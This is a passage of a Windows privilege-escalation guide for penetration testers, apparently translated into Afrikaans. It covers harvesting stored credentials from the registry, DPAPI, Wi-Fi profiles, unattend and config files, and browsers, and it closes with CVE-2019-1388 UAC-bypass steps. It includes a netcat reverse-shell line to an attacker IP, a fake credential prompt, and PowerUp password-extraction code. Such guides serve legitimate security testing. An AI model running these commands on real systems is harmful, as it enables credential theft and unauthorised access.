[**Kyk na hierdie bladsy vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, afskakel, afskakel...)**

Meer[ opdragte vir netwerk-ontleding hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root user kry, kan jy op enige poort luister (die eerste keer as jy `nc.exe` gebruik om na 'n poort te luister, sal dit via die GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as root te begin, kan jy `--default-user root` probeer

Jy kan die `WSL` lêerstelsel verken in die gids `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows-inlogbewyse

### Winlogon-inlogbewyse
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Die Windows Vault stoor gebruikerskredensiale vir bedieners, webwerwe en ander programme wat **Windows** **outomaties die gebruikers kan aanmeld**. Op die eerste oogopslag mag dit lyk asof gebruikers nou hul Facebook-kredensiale, Twitter-kredensiale, Gmail-kredensiale ens. kan stoor, sodat hulle outomaties via blaaiers aanmeld. Maar dit is nie so nie.

Windows Vault stoor kredensiale wat Windows outomaties kan gebruik om gebruikers aan te meld, wat beteken dat enige **Windows application that needs credentials to access a resource** (bediener of 'n webwerf) **can make use of this Credential Manager** & Windows Vault en die verskafde kredensiale kan gebruik in plaas daarvan dat gebruikers die gebruikersnaam en wagwoord altyd self invoer.

Tensy die toepassings met Credential Manager interaksie het, dink ek nie dit is moontlik vir hulle om die kredensiale vir 'n gegewe hulpbron te gebruik nie. Dus, as jou toepassing die vault wil gebruik, moet dit op een of ander wyse **kommunikeer met die credential manager en die kredensiale vir daardie hulpbron versoek** uit die standaard stoor-vault.

Gebruik die `cmdkey` om die gestoorde kredensiale op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred` opsie gebruik om die gestoorde credentials te gebruik. Die volgende voorbeeld roep 'n remote binary via 'n SMB share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik van `runas` met 'n verskafde stel credentials.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Let wel dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of vanaf die [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bied 'n metode vir symmetriese enkripsie van data, hoofsaaklik gebruik binne die Windows-bedryfstelsel vir die symmetriese enkripsie van asymmetriese privaat sleutels. Hierdie enkripsie maak gebruik van 'n gebruiker- of stelselgeheim wat in groot mate tot entropie bydra.

**DPAPI maak die enkripsie van sleutels moontlik deur 'n symmetriese sleutel wat afgelei is van die gebruiker se aanmeldgeheime.** In scenario's met stelselenkripsie gebruik dit die stelsel se domeinverifikasie-geheime.

Geënkripteerde gebruikers-RSA-sleutels, deur DPAPI gebruik, word gestoor in die %APPDATA%\Microsoft\Protect\{SID} gids, waar {SID} die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI-sleutel, wat saam met die meestersleutel wat die gebruiker se privaat sleutels in dieselfde lêer beskerm, geplaas is,** bestaan tipies uit 64 bytes lukrake data. (Dit is belangrik om op te let dat toegang tot hierdie gids beperk is, wat verhoed dat sy inhoud met die dir-opdrag in CMD gelys word, alhoewel dit via PowerShell gelys kan word).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te ontsleutel.

Die **credentials files protected by the master password** lê gewoonlik in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan die **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te decrypt.\
Jy kan **extract many DPAPI** **masterkeys** uit **memory** met die `sekurlsa::dpapi` module (indien jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** word dikwels gebruik vir **scripting** en automatiseringstake as 'n manier om encrypted credentials gerieflik te stoor. Die credentials word beskerm deur **DPAPI**, wat gewoonlik beteken dat hulle slegs deur dieselfde gebruiker op dieselfde rekenaar waarop hulle geskep is, kan decrypted word.

Om 'n PS credentials uit die lêer wat dit bevat te **decrypt**, kan jy:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindinge

Jy kan hulle vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs uitgevoerde opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Geloofsbriefbestuurder**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with the appropriate `/masterkey` om **enige .rdg files te ontsleutel**\
Jy kan **baie DPAPI masterkeys** uit geheue onttrek met die Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Mense gebruik dikwels die StickyNotes app op Windows werkstasies om **wagwoorde te stoor** en ander inligting, sonder om te besef dat dit 'n databasislêer is. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om na te soek en te ondersoek.

### AppCmd.exe

**Let daarop dat om wagwoorde uit AppCmd.exe te herstel, moet jy Administrator wees en dit onder 'n High Integrity level uitvoer.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\` directory.\
As hierdie lêer bestaan, is dit moontlik dat sommige **credentials** gekonfigureer is en **herstel kan word**.

Hierdie kode is onttrek uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kontroleer of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installers word **met SYSTEM privileges uitgevoer**, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in die register

SSH private keys kan binne die registersleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, dus moet jy kyk of daar iets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige item binne daardie pad vind, sal dit waarskynlik 'n gestoor SSH-sleutel wees. Dit is versleuteld gestoor maar kan maklik ontsleutel word met behulp van [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent` diens nie loop nie en jy wil hê dit moet outomaties by opstart begin, voer uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om sommige ssh-sleutels te skep, dit met `ssh-add` by te voeg en via ssh by 'n masjien aan te meld. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` tydens die asymmetriese sleutelverifikasie geïdentifiseer nie.

### Onbewaakte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook na hierdie lêers soek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM- en SYSTEM-rugsteun
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolk-inlogbewyse
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek na 'n lêer genaamd **SiteList.xml**

### Gekacheerde GPP Wagwoord

Daar was voorheen 'n funksie beskikbaar wat die uitrol van pasgemaakte plaaslike administrateurrekeninge op 'n groep masjiene via Group Policy Preferences (GPP) toegelaat het. Hierdie metode het egter aansienlike sekuriteitsgebreke gehad. Eerstens kon die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is, deur enige domeingebruiker geraadpleeg word. Tweedens kon die wagwoorde binne hierdie GPPs, wat met AES256 versleuteld is met 'n publiek gedokumenteerde standaard sleutel, deur enige geverifieerde gebruiker gedekripteer word. Dit het 'n ernstige risiko geskep, aangesien dit gebruikers kon toelaat om verhoogde regte te verkry.

Om hierdie risiko te versag, is 'n funksie ontwikkel om na plaaslik gekacheerde GPP-lêers te soek wat 'n "cpassword" veld bevat wat nie leeg is nie. Nadat so 'n lêer gevind is, dekripteer die funksie die wagwoord en gee 'n pasgemaakte PowerShell-objek terug. Hierdie objek sluit besonderhede oor die GPP en die lêer se ligging in, wat help met die identifisering en oplossing van hierdie sekuriteitskwessie.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor Windows Vista)_ vir hierdie lêers:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te dekripteer:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die passwords te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web-konfigurasie
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-inlogbesonderhede
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logboeke
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir credentials

Jy kan altyd **die gebruiker vra om sy credentials in te voer of selfs die credentials van 'n ander gebruiker** as jy dink hy dit kan weet (let wel dat om die kliënt direk te **vra** vir die **credentials** regtig **riskant** is):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêername wat credentials bevat**

Bekende lêers wat vroeër **passwords** in **clear-text** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Soek alle voorgestelde lêers:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in die RecycleBin

Jy moet ook die Bin nagaan om na credentials daarin te soek

Om **wagwoorde te herstel** wat deur verskeie programme gestoor is, kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die registry

**Ander moontlike registry keys met credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiergeskiedenis

Jy moet kyk vir dbs waar wagwoorde van **Chrome or Firefox** gestoor word.\
Kyk ook na die geskiedenis, bookmarks en favourites van die blaaiers aangesien sommige **wagwoorde dalk** daar gestoor is.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Oorskryf**

Component Object Model (COM) is ’n tegnologie ingebou in die Windows operating system wat interkommunikasie tussen sagtewarekomponente in verskillende tale toelaat. Elke COM-komponent word geïdentifiseer deur ’n class ID (CLSID) en elke komponent stel funksionaliteit beskikbaar via een of meer interfaces, geïdentifiseer deur interface IDs (IIDs).

COM-klasse en -interfaces word in die register gedefinieer onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** onderskeidelik. Hierdie register word geskep deur die samestelling van **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be Apartment (Single-Threaded), Free (Multi-Threaded), Both (Single or Multi) or Neutral (Thread Neutral).

![](<../../images/image (729).png>)

In die praktyk, as jy enige van die DLLs wat uitgevoer gaan word kan oorskryf, kan jy bevoegdhede eskaleer as daardie DLL deur ’n ander gebruiker uitgevoer gaan word.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Algemene soektog na wagwoorde in lêers en register**

**Soek na lêerinhalte**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n bepaalde lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek die registry vir key names en passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat na wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf** plugin; ek het hierdie plugin geskep om elke metasploit POST module wat na credentials soek outomaties binne die slagoffer uit te voer.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat wagwoorde bevat wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende tool om wagwoorde uit 'n stelsel te onttrek.

Die tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessions**, **usernames** en **passwords** van verskeie tools wat hierdie data in platte teks stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stel jou voor dat **'n proses wat as SYSTEM loop 'n nuwe proses oopmaak** (`OpenProcess()`) met **full access**. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met low privileges maar wat al die open handles van die hoofproses erf**.\
As jy dan **full access tot die low privileged process** het, kan jy die **open handle na die privileged proses wat met `OpenProcess()` geskep is** gryp en **inject a shellcode**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid te detect en exploit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander post vir 'n meer volledige verklaring oor hoe om meer open handlers van prosesse en threads te toets en misbruik wat met verskillende vlakke van permissies geërf word (nie net full access nie)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheuesegmente, bekend as **pipes**, maak proseskommunikasie en data-oordrag moontlik.

Windows bied 'n funksie genaamd **Named Pipes**, wat toelaat dat onverwante prosesse data deel, selfs oor verskillende netwerke. Dit lyk soos 'n client/server architecture, met rolle gedefinieer as **named pipe server** en **named pipe client**.

Wanneer data deur 'n **client** deur 'n pipe gestuur word, het die **server** wat die pipe opgestel het die vermoë om die **identiteit van die client aan te neem**, mits dit die nodige **SeImpersonate** regte het. Om 'n **privileged process** te identifiseer wat via 'n pipe kommunikeer wat jy kan naboots, bied die geleentheid om **hoër voorregte te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pipe wat jy opgestel het interaksie het. Vir instruksies oor hoe om so 'n aanval uit te voer, is nuttige gidse [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system).

Ook laat die volgende tool jou toe om **'n named pipe communication te intercept met 'n tool soos burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie tool laat toe om alle pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Diverses

### File Extensions that could execute stuff in Windows

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Wanneer jy 'n shell as 'n gebruiker kry, mag daar geskeduleerde take of ander prosesse wees wat uitgevoer word wat **credentials op die command line deurgee**. Die script hieronder vang proses command lines elke twee sekondes op en vergelyk die huidige toestand met die vorige toestand, en gee enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Steel wagwoorde uit prosesse

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang het tot die grafiese koppelvlak (via console of RDP) en UAC geaktiveer is, is dit in sommige weergawes van Microsoft Windows moontlik om 'n terminal of enige ander proses soos "NT\AUTHORITY SYSTEM" te laat loop vanaf 'n ongeprivilegieerde gebruiker.

Dit maak dit moontlik om privilegies op te skerp en UAC terselfdertyd met dieselfde kwesbaarheid te omseil. Daarbenewens is daar geen behoefte om enigiets te installeer nie en die binary wat tydens die proses gebruik word, is onderteken en uitgegee deur Microsoft.

Sommige van die geraakte stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid uit te buit, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

